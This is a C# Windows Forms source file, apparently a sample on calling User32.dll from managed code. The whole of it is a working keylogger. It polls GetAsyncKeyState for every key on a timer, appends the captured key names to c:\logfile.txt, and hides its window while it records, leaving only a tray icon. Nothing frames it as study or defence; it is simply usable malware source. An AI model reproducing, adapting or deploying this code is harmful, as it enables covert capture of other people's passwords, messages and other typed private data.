using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace CallingUnmanagedCode
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);

        StringBuilder keyBuffer;
        private void Form1_Load(object sender, EventArgs e)
        {
            keyBuffer = new StringBuilder();
        }

        void CreateLog(string file)
        {
            try
            {
                StreamWriter sw = new StreamWriter(file,true);//I used true to append log to file
                sw.Write(keyBuffer.ToString());
                sw.Close();
                keyBuffer.Clear(); // reset buffer
            }
            catch
            {
            }
             
        }

        private void key_Tick(object sender, EventArgs e)
        {
            foreach(System.Int32 i in Enum.GetValues(typeof(Keys))) //Iterate through each key to know whether it was pressed or not
			{
				if(GetAsyncKeyState(i) == -32767)   //-32767(minimum value) indicates that key was pressed since we last called this function
				{
					keyBuffer.Append(Enum.GetName(typeof(Keys), i));
                    keyBuffer.Append(' ');
				}
			}		
        }

        private void log_Tick(object sender, EventArgs e)
        {
            CreateLog(@"c:\logfile.txt");
        }

        private void button1_Click(object sender, EventArgs e)
        {   this.Hide();
            this.Opacity = 0;
            key.Enabled = true;
            log.Enabled = true;
            notifyIcon1.ShowBalloonTip(5000);
            button2.Enabled = true;
            button1.Enabled = false;
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.Opacity = 1;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            key.Enabled = false;
            log.Enabled = false;
            button1.Enabled = true;
            button2.Enabled = false;            
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            
            
        }
    }
}
